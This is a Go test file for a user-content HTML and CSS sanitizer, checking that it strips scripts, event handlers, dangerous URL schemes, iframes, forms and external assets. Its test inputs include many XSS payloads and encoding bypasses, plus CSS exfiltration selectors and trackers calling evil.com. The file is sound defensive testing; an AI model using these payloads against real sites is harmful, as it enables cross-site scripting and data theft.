package usercontent_test

import (
	"errors"
	"strings"
	"testing"

	"github.com/gobeaver/go-beaver-tag-sanitization/usercontent"
	"github.com/gobeaver/go-beaver-tag-sanitization/usercontent/profiles"
)

func TestNew_FullPageValid(t *testing.T) {
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		t.Fatalf("ProfileFullPage did not validate: %v", err)
	}
	if s == nil {
		t.Fatal("nil sanitizer")
	}
}

func TestNew_EmbedValid(t *testing.T) {
	s, err := usercontent.New(profiles.ProfileEmbed())
	if err != nil {
		t.Fatalf("ProfileEmbed did not validate: %v", err)
	}
	if s == nil {
		t.Fatal("nil sanitizer")
	}
}

func TestNew_RejectsScriptTag(t *testing.T) {
	p := profiles.ProfileFullPage()
	p.AllowedTags = append(p.AllowedTags, "script")
	_, err := usercontent.New(p)
	if err == nil {
		t.Fatal("profile with script tag should be rejected")
	}
	if !errors.Is(err, usercontent.ErrInvalidProfile) {
		t.Fatalf("expected ErrInvalidProfile, got %v", err)
	}
}

func TestNew_RejectsIframe(t *testing.T) {
	p := profiles.ProfileFullPage()
	p.AllowedTags = append(p.AllowedTags, "iframe")
	_, err := usercontent.New(p)
	if err == nil {
		t.Fatal("profile with iframe tag should be rejected")
	}
}

func TestNew_RejectsOnClickAttribute(t *testing.T) {
	p := profiles.ProfileFullPage()
	p.AllowedAttrs["*"] = append(p.AllowedAttrs["*"], "onclick")
	_, err := usercontent.New(p)
	if err == nil {
		t.Fatal("profile with onclick attribute should be rejected")
	}
}

func TestNew_RejectsJavaScriptURL(t *testing.T) {
	p := profiles.ProfileFullPage()
	p.URLSchemes = append(p.URLSchemes, "javascript")
	_, err := usercontent.New(p)
	if err == nil {
		t.Fatal("profile with javascript: URL scheme should be rejected")
	}
}

func TestNew_RejectsScriptSrcPolicy(t *testing.T) {
	p := profiles.ProfileFullPage()
	p.CSP.ScriptSrc = "'unsafe-inline'"
	_, err := usercontent.New(p)
	if err == nil {
		t.Fatal("profile with unsafe-inline script-src should be rejected")
	}
}

func TestNew_AcceptsHashScriptSrc(t *testing.T) {
	p := profiles.ProfileFullPage()
	p.CSP.ScriptSrc = "'sha256-abcdef0123456789=='"
	if _, err := usercontent.New(p); err != nil {
		t.Fatalf("hash script-src should be accepted: %v", err)
	}
}

func TestNew_RejectsExpressionInCSS(t *testing.T) {
	p := profiles.ProfileFullPage()
	p.CSS.AllowedFunctions = append(p.CSS.AllowedFunctions, "expression")
	_, err := usercontent.New(p)
	if err == nil {
		t.Fatal("CSS expression() should be rejected")
	}
}

func TestNew_RejectsImportAtRule(t *testing.T) {
	p := profiles.ProfileFullPage()
	p.CSS.AllowedAtRules = append(p.CSS.AllowedAtRules, "import")
	_, err := usercontent.New(p)
	if err == nil {
		t.Fatal("CSS @import should be rejected")
	}
}

func TestSanitizeHTML_StripsScriptTag(t *testing.T) {
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		t.Fatal(err)
	}
	in := `<p>hi</p><script>alert(1)</script><p>bye</p>`
	out, rep, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if !rep.Modified {
		t.Errorf("expected modified report, got %+v", rep)
	}
	if strings.Contains(strings.ToLower(out), "<script") {
		t.Errorf("script tag leaked: %s", out)
	}
	if strings.Contains(out, "alert(1)") {
		t.Errorf("script body leaked: %s", out)
	}
}

func TestSanitizeHTML_StripsOnClick(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<a href="https://example.com" onclick="alert(1)">click</a>`
	out, rep, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "onclick") {
		t.Errorf("onclick leaked: %s", out)
	}
	if !rep.Modified {
		t.Errorf("expected modified report")
	}
}

func TestSanitizeHTML_StripsJavaScriptURL(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<a href="javascript:alert(1)">click</a>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "javascript:") {
		t.Errorf("javascript: URL leaked: %s", out)
	}
}

func TestSanitizeHTML_StripsVBScriptURL(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<a href="vbscript:msgbox(1)">click</a>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "vbscript:") {
		t.Errorf("vbscript: URL leaked: %s", out)
	}
}

func TestSanitizeHTML_StripsDataTextHTML(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	// data:text/html is not allowed regardless of AllowDataImages
	in := `<a href="data:text/html,<script>alert(1)</script>">click</a>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "<script") {
		t.Errorf("data:text/html script leaked: %s", out)
	}
}

func TestSanitizeHTML_StripsIframe(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<p>hi</p><iframe src="https://evil.com"></iframe>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "<iframe") {
		t.Errorf("iframe leaked: %s", out)
	}
}

func TestSanitizeHTML_StripsObjectEmbed(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<object data="x.swf"><embed src="y.swf"></object>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "<object") {
		t.Errorf("object leaked: %s", out)
	}
	if strings.Contains(strings.ToLower(out), "<embed") {
		t.Errorf("embed leaked: %s", out)
	}
}

func TestSanitizeHTML_StripsForm(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<form action="https://evil.com"><input type="text" name="x"></form>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "<form") {
		t.Errorf("form leaked: %s", out)
	}
	if strings.Contains(strings.ToLower(out), "<input") {
		t.Errorf("input leaked: %s", out)
	}
}

func TestSanitizeHTML_StripsMetaRefresh(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<meta http-equiv="refresh" content="0;url=https://evil.com">`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "<meta") {
		t.Errorf("meta leaked: %s", out)
	}
}

func TestSanitizeHTML_StripsBase(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<base href="https://evil.com">`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "<base") {
		t.Errorf("base leaked: %s", out)
	}
}

func TestSanitizeHTML_StripsSVG(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<svg onload="alert(1)"></svg>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "<svg") {
		t.Errorf("svg leaked: %s", out)
	}
	if strings.Contains(strings.ToLower(out), "onload") {
		t.Errorf("onload leaked: %s", out)
	}
}

func TestSanitizeHTML_StripsComments(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<p>visible</p><!-- secret --><p>visible2</p>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "secret") {
		t.Errorf("comment content leaked: %s", out)
	}
	if strings.Contains(out, "<!--") {
		t.Errorf("comment leaked: %s", out)
	}
}

func TestSanitizeHTML_StripsConditionalComments(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<![if IE]><script>alert(1)</script><![endif]>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "<script") {
		t.Errorf("conditional comment script leaked: %s", out)
	}
}

func TestSanitizeHTML_StripsExternalImage(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	// Random external host shouldn't match asset prefixes
	in := `<img src="https://evil.com/tracker.png">`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "evil.com") {
		t.Errorf("external image leaked: %s", out)
	}
}

func TestSanitizeHTML_AllowsSameSiteImage(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<img src="/assets/photo.png" alt="x">`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "/assets/photo.png") {
		t.Errorf("same-origin image dropped: %s", out)
	}
}

func TestSanitizeHTML_AllowsDataImage(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<img src="data:image/png;base64,AAAA" alt="x">`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "data:image/png") {
		t.Errorf("data image dropped: %s", out)
	}
}

func TestSanitizeHTML_StripsInlineStyle(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<p style="background:url(javascript:alert(1))">x</p>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "style=") {
		t.Errorf("inline style leaked: %s", out)
	}
}

func TestSanitizeHTML_WhitespaceEncoding(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	// Browsers tolerate whitespace inside the scheme; we should too.
	in := `<a href="java\tscript:alert(1)">x</a>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "alert(1)") {
		t.Errorf("javascript-url body leaked: %s", out)
	}
}

func TestSanitizeHTML_LowercaseScheme(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<a href="JaVaScRiPt:alert(1)">x</a>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "javascript:") {
		t.Errorf("mixed-case javascript: URL leaked: %s", out)
	}
}

func TestSanitizeHTML_HTMLEntityEncodedURL(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	// &#106;avascript: -> javascript:
	in := `<a href="&#106;avascript:alert(1)">x</a>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "javascript:") {
		t.Errorf("entity-encoded javascript: URL leaked: %s", out)
	}
}

func TestSanitizeHTML_MaxDepth(t *testing.T) {
	p := profiles.ProfileFullPage()
	p.MaxDOMDepth = 5
	s, err := usercontent.New(p)
	if err != nil {
		t.Fatal(err)
	}
	in := `<div><div><div><div><div><div><div>x</div></div></div></div></div></div></div>`
	_, _, err = s.SanitizeHTML(in)
	if !errors.Is(err, usercontent.ErrTooDeep) {
		t.Errorf("expected ErrTooDeep, got %v", err)
	}
}

func TestSanitizeHTML_MaxBytes(t *testing.T) {
	p := profiles.ProfileFullPage()
	p.MaxHTMLBytes = 10
	s, _ := usercontent.New(p)
	_, _, err := s.SanitizeHTML(strings.Repeat("a", 100))
	if !errors.Is(err, usercontent.ErrInputTooLarge) {
		t.Errorf("expected ErrInputTooLarge, got %v", err)
	}
}

func TestSanitizeHTML_AddsRelToAnchor(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `<a href="https://example.com" target="_blank">x</a>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "noopener noreferrer nofollow ugc") {
		t.Errorf("rel not added: %s", out)
	}
	if !strings.Contains(out, `target="_blank"`) {
		t.Errorf("target dropped: %s", out)
	}
}

func TestSanitizeCSS_StripsImport(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `@import url("https://evil.com/x.css"); p { color: red; }`
	out, _, err := s.SanitizeCSS(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "@import") {
		t.Errorf("@import leaked: %s", out)
	}
	if !strings.Contains(out, "color") {
		t.Errorf("safe declaration dropped: %s", out)
	}
}

func TestSanitizeCSS_StripsExpression(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `p { width: expression(alert(1)); }`
	out, _, err := s.SanitizeCSS(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.ToLower(out), "expression") {
		t.Errorf("expression() leaked: %s", out)
	}
}

func TestSanitizeCSS_StripsExternalURL(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `p { background: url(https://evil.com/x.png); }`
	out, _, err := s.SanitizeCSS(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "evil.com") {
		t.Errorf("external URL leaked: %s", out)
	}
}

func TestSanitizeCSS_AllowsSameOriginURL(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	in := `p { background: url(/assets/bg.png); }`
	out, _, err := s.SanitizeCSS(in)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "/assets/bg.png") {
		t.Errorf("same-origin URL dropped: %s", out)
	}
}

func TestSanitizeCSS_RejectsDisallowedDeclaration(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	// pick a declaration not in the default allowlist
	in := `p { someVendorProp: value; }`
	out, _, err := s.SanitizeCSS(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "someVendorProp") {
		t.Errorf("disallowed declaration leaked: %s", out)
	}
}

func TestSanitizeCSS_RejectsAttributeSelectors(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	// Attribute selectors are a known exfiltration vector.
	in := `input[value^="a"] { background: url("https://evil.com/leak"); }`
	out, _, err := s.SanitizeCSS(in)
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(out, "[value^=") {
		t.Errorf("attribute selector leaked: %s", out)
	}
}

func TestCSPHeaders(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	headers := s.CSPHeaders()
	csp, ok := headers["Content-Security-Policy"]
	if !ok {
		t.Fatal("CSP header missing")
	}
	for _, must := range []string{
		"default-src 'none'",
		"script-src 'none'",
		"style-src 'self' 'unsafe-inline'",
		"img-src 'self' data:",
		"frame-src 'none'",
		"form-action 'none'",
		"base-uri 'none'",
	} {
		if !strings.Contains(csp, must) {
			t.Errorf("CSP missing %q\nheader: %s", must, csp)
		}
	}
	if headers["Referrer-Policy"] != "no-referrer" {
		t.Errorf("Referrer-Policy wrong: %q", headers["Referrer-Policy"])
	}
	if headers["X-Content-Type-Options"] != "nosniff" {
		t.Errorf("X-Content-Type-Options wrong: %q", headers["X-Content-Type-Options"])
	}
}

func TestReport_Summary(t *testing.T) {
	r := usercontent.Report{
		Modified: true,
		Removed: []usercontent.Removal{
			{Kind: usercontent.RemovalKindForbiddenElement, Value: "script"},
			{Kind: usercontent.RemovalKindEventHandler, Value: "onclick"},
			{Kind: usercontent.RemovalKindEventHandler, Value: "onerror"},
		},
	}
	s := r.Summary()
	if !strings.Contains(s, "1 forbidden element") {
		t.Errorf("summary: %s", s)
	}
	if !strings.Contains(s, "2 event handlers") {
		t.Errorf("summary: %s", s)
	}
}

func TestReport_Empty(t *testing.T) {
	r := usercontent.Report{}
	if s := r.Summary(); s != "no changes" {
		t.Errorf("empty summary: %s", s)
	}
}

// Tests below are bigger regression tests against the corpus.

func TestSanitizeHTML_OWASP_XSS_Basic(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	cases := []string{
		// <script> in attribute
		`<img src="x" onerror="alert(1)">`,
		// <svg onload>
		`<svg/onload=alert(1)>`,
		// <body onload>
		`<body onload=alert(1)>`,
		// <iframe src=javascript:>
		`<iframe src="javascript:alert(1)">`,
		// <meta http-equiv refresh>
		`<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
		// <embed src=javascript:>
		`<embed src="javascript:alert(1)">`,
		// <form> with action
		`<form action="javascript:alert(1)"><input type=submit></form>`,
		// <object data=javascript:>
		`<object data="javascript:alert(1)"></object>`,
		// <a href=javascript:>
		`<a href="javascript:alert(1)">x</a>`,
		// <details ontoggle>
		`<details ontoggle=alert(1) open>`,
		// <marquee onstart>
		`<marquee onstart=alert(1)>`,
		// <button> with formaction
		`<button formaction="javascript:alert(1)">x</button>`,
	}
	for _, in := range cases {
		out, _, err := s.SanitizeHTML(in)
		if err != nil {
			t.Errorf("err on %q: %v", in, err)
			continue
		}
		lower := strings.ToLower(out)
		for _, bad := range []string{
			"<script", "alert(1)", "javascript:", "onerror", "onload",
			"ontoggle", "onstart", "onclick", "<iframe", "<object",
			"<embed", "<form", "<meta", "<button", "<svg", "<details",
			"<marquee", "formaction=",
		} {
			if strings.Contains(lower, bad) {
				t.Errorf("input %q -> output %q leaked %q", in, out, bad)
			}
		}
	}
}

func TestSanitizeHTML_EncodingsAndBypasses(t *testing.T) {
	s, _ := usercontent.New(profiles.ProfileFullPage())
	cases := []string{
		// tab/newline inside scheme
		`<a href="java\tscript:alert(1)">x</a>`,
		`<a href="java\nscript:alert(1)">x</a>`,
		// CR inside scheme
		`<a href="java\rscript:alert(1)">x</a>`,
		// HTML entity encoding
		`<a href="&#106;avascript:alert(1)">x</a>`,
		// Numeric decimal
		`<a href="&#0000106;avascript:alert(1)">x</a>`,
		// Numeric hex
		`<a href="&#x6A;avascript:alert(1)">x</a>`,
		// Mixed case
		`<a href="JaVaScRiPt:alert(1)">x</a>`,
		// DATA:text/html
		`<a href="data:text/html,<script>alert(1)</script>">x</a>`,
		// DATA:text/html;base64
		`<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
		// Nested tag injection
		`<scr<script>ipt>alert(1)</scr</script>ipt>`,
		// SVG with namespace switch
		`<svg><script>alert(1)</script></svg>`,
		// CSS expression in style attribute
		`<div style="background:url(javascript:alert(1))">x</div>`,
		// CSS expression (legacy IE)
		`<div style="width:expression(alert(1))">x</div>`,
	}
	for _, in := range cases {
		out, _, err := s.SanitizeHTML(in)
		if err != nil {
			t.Errorf("err on %q: %v", in, err)
			continue
		}
		lower := strings.ToLower(out)
		if strings.Contains(lower, "alert(1)") {
			t.Errorf("alert(1) leaked in %q -> %q", in, out)
		}
		if strings.Contains(lower, "<script") {
			t.Errorf("<script leaked in %q -> %q", in, out)
		}
		if strings.Contains(lower, "javascript:") {
			t.Errorf("javascript: leaked in %q -> %q", in, out)
		}
	}
}

func TestStrippedSubtreeContainment(t *testing.T) {
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		t.Fatal(err)
	}
	in := `<form></div>LEAKED<p>x</p></form>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatalf("SanitizeHTML failed: %v", err)
	}
	if strings.Contains(out, "LEAKED") {
		t.Errorf("stripped subtree content leaked: got %q", out)
	}
}

func TestHostAndOriginAllowlistForAssets(t *testing.T) {
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		t.Fatal(err)
	}
	in := `<img src="https://evil.com/r/track.png">`
	out, rep, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatalf("SanitizeHTML failed: %v", err)
	}
	if strings.Contains(out, "evil.com") {
		t.Errorf("unallowed host evil.com leaked in asset URL: %q", out)
	}
	if len(rep.Removed) == 0 {
		t.Errorf("expected removal report for evil.com asset URL")
	}
}

func TestProtocolRelativeURLRejection(t *testing.T) {
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		t.Fatal(err)
	}
	in := `<img src="//evil.com/track.png">`
	out, rep, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatalf("SanitizeHTML failed: %v", err)
	}
	if strings.Contains(out, "evil.com") {
		t.Errorf("protocol-relative URL passed: %q", out)
	}
	if len(rep.Removed) == 0 {
		t.Errorf("expected removal for protocol-relative URL")
	}
}

func TestDataURLRestrictedToImageContexts(t *testing.T) {
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		t.Fatal(err)
	}
	in := `<a href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">link</a>`
	out, rep, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatalf("SanitizeHTML failed: %v", err)
	}
	if strings.Contains(out, "href=\"data:") {
		t.Errorf("data: URL passed in link position: %q", out)
	}
	if len(rep.Removed) == 0 {
		t.Errorf("expected removal for data: URL in link position")
	}
}

func TestRelNoopenerPerElement(t *testing.T) {
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		t.Fatal(err)
	}
	in := `<a href="https://example.com/1" target="_blank">link1</a><a href="https://example.com/2" target="_blank">link2</a>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatalf("SanitizeHTML failed: %v", err)
	}
	count := strings.Count(out, `rel="noopener noreferrer nofollow ugc"`)
	if count != 2 {
		t.Errorf("expected 2 rel attributes on target=_blank links, got %d in %q", count, out)
	}
}

func TestShellNamespaceProtectionInCSS(t *testing.T) {
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		t.Fatal(err)
	}
	in := `.gb-shell-field { display: none }`
	out, rep, err := s.SanitizeCSS(in)
	if err != nil {
		t.Fatalf("SanitizeCSS failed: %v", err)
	}
	if strings.Contains(out, ".gb-shell-field") {
		t.Errorf("shell namespace selector passed in CSS: %q", out)
	}
	if len(rep.Removed) == 0 {
		t.Errorf("expected removal report for shell namespace CSS selector")
	}
}

func TestCharsetValidation_InvalidUTF8(t *testing.T) {
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		t.Fatal(err)
	}
	for _, in := range []string{"\xff\xfe\xfd", "hello \\xff\\xfe\\xfd world"} {
		_, _, err = s.SanitizeHTML(in)
		if err == nil || !errors.Is(err, usercontent.ErrInvalidUTF8) {
			t.Errorf("expected ErrInvalidUTF8 for %q, got %v", in, err)
		}
	}
}

func TestCharsetValidation_NULAndControl(t *testing.T) {
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		t.Fatal(err)
	}
	for _, in := range []string{"<p>a\x00b</p>", "<p>a\\x00b</p>", "<p>a\\0b</p>", "<p>a\x07b</p>", "<p>a\x1fb</p>"} {
		_, _, err := s.SanitizeHTML(in)
		if err == nil || !errors.Is(err, usercontent.ErrInvalidCharacter) {
			t.Errorf("expected ErrInvalidCharacter for %q, got %v", in, err)
		}
	}
}

func TestCharsetValidation_BidiAndInvisible(t *testing.T) {
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		t.Fatal(err)
	}
	for _, in := range []string{
		"gnp.exe\u202E",
		"java\u200Bscript",
		"test\uFEFFvalue",
		"hello\u2060world",
		"Hello\u2028World",
		"Hello\u2029World",
	} {
		_, _, err := s.SanitizeHTML(in)
		if err == nil || !errors.Is(err, usercontent.ErrInvalidCharacter) {
			t.Errorf("expected ErrInvalidCharacter for %q, got %v", in, err)
		}
	}
}

func TestIDNHomoglyphHostRejection(t *testing.T) {
	p := profiles.ProfileFullPage()
	p.AssetPrefixes = []string{"https://google.com/"}
	s, err := usercontent.New(p)
	if err != nil {
		t.Fatal(err)
	}

	// ASCII host: accepted
	inValid := `<img src="https://google.com/image.png">`
	out, _, err := s.SanitizeHTML(inValid)
	if err != nil || !strings.Contains(out, "google.com") {
		t.Errorf("valid ASCII host rejected: out=%q err=%v", out, err)
	}

	// Cyrillic 'о' homoglyph host: rejected
	inHomoglyph := `<img src="https://gоogle.com/image.png">`
	out2, rep, err := s.SanitizeHTML(inHomoglyph)
	if err != nil {
		t.Fatalf("SanitizeHTML returned unexpected infrastructure error: %v", err)
	}
	if strings.Contains(out2, "gоogle.com") {
		t.Errorf("homoglyph host passed: %q", out2)
	}
	if len(rep.Removed) == 0 {
		t.Errorf("expected removal report for homoglyph host")
	}
}

func TestSubtreeContainment_Mismatched(t *testing.T) {
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		t.Fatal(err)
	}
	in := `<form><span>SECRET</div>VISIBLE</span></form>`
	out, _, err := s.SanitizeHTML(in)
	if err != nil {
		t.Fatalf("SanitizeHTML failed: %v", err)
	}
	if strings.Contains(out, "SECRET") || strings.Contains(out, "VISIBLE") {
		t.Errorf("subtree content leaked in mismatched tags: got %q", out)
	}
}

func TestEntityEncodedControlChars(t *testing.T) {
	s, err := usercontent.New(profiles.ProfileFullPage())
	if err != nil {
		t.Fatal(err)
	}
	for _, in := range []string{
		"<p>a&#7;b&#31;c</p>",
		"<p>a&#x07;b</p>",
		"<p>a&#0;b</p>",
		"<p>a&#x202E;b</p>",
		"<p>a&#8238;b</p>",
	} {
		_, _, err := s.SanitizeHTML(in)
		if err == nil || !errors.Is(err, usercontent.ErrInvalidCharacter) {
			t.Errorf("expected ErrInvalidCharacter for entity-encoded input %q, got: %v", in, err)
		}
	}
}
